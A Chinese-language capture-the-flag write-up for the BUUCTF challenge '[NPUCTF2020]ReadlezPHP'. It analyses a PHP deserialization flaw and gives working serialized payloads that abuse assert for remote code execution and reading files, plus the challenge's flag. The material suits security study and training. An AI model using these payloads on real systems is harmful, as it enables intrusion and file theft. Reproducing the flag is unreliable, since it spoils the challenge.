---
title: "[NPUCTF2020]ReadlezPHP"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-deserialization, rce, assert]
vulnerability: PHP 反序列化漏洞导致任意代码执行
solved: true
flag: "NPUCTF{this_is_not_a_fake_flag_but_true_flag}"
---

# [NPUCTF2020]ReadlezPHP

## 题目概述
题目是一个 PHP 代码审计题，通过访问 `time.php?source` 可以看到源码。

## 信息收集
1. 访问首页，发现页面中有链接指向 `time.php?source`
2. 访问 `time.php?source` 获取源码

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：PHP 反序列化 + 任意函数调用

**源码分析**：
```php
class HelloPhp {
    public $a;
    public $b;
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);  // 危险：$b($a) 可以执行任意函数
    }
}
@$ppp = unserialize($_GET["data"]);
```

**漏洞原理**：
- `__destruct()` 魔术方法中执行 `$b($a)`，即调用 `$b` 函数，参数为 `$a`
- 通过反序列化可以控制 `$a` 和 `$b` 的值
- 可以设置 `$b = "assert"`, `$a = "任意PHP代码"` 来执行代码

## 利用过程（Payload + Flag）

**Payload 构造**：
```php
<?php
class HelloPhp {
    public $a;
    public $b;
}
$obj = new HelloPhp();
$obj->a = "print_r(scandir('/'));";  // 列出根目录
$obj->b = "assert";
echo urlencode(serialize($obj));
```

**最终 Payload**：
```
?data=O:8:"HelloPhp":2:{s:1:"a";s:21:"print_r(scandir('/'));";s:1:"b";s:6:"assert";}
```

**获取 flag**：
1. 使用 `scandir('/')` 发现根目录有文件 `/FIag_!S_it`（注意是 FIag 不是 Flag）
2. 使用 `file_get_contents('/FIag_!S_it')` 读取 flag

**完整 Payload**：
```
?data=O:8:"HelloPhp":2:{s:1:"a";s:46:"print(trim(file_get_contents('/FIag_!S_it')));";s:1:"b";s:6:"assert";}
```

**Flag**: `NPUCTF{this_is_not_a_fake_flag_but_true_flag}`

## 复现步骤
1. 访问题目 URL
2. 在首页源码中发现 `time.php?source` 链接
3. 访问 `time.php?source` 获取 PHP 源码
4. 分析源码，发现反序列化漏洞
5. 构造反序列化 payload，使用 assert 函数执行代码
6. 使用 scandir 列出根目录，发现 `/FIag_!S_it` 文件
7. 使用 file_get_contents 读取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 反序列化 | `unserialize($_GET["data"])` | `$b="assert"; $a="code;"` | 魔术方法 __destruct、assert 代码执行 |
| 任意函数调用 | `$b($a)` | `assert("file_get_contents('/flag')")` | PHP 可变函数特性 |

## 知识总结（解题技巧、同类题型套路）

1. **PHP 反序列化漏洞**：重点关注 `__destruct()`、`__wakeup()` 等魔术方法
2. **可变函数**：PHP 支持通过变量调用函数，如 `$func($arg)`
3. **assert 函数**：可以执行任意 PHP 代码，是常见的 RCE 手段
4. **文件名混淆**：注意 flag 文件名可能有特殊字符或混淆（如 `FIag` 代替 `Flag`）
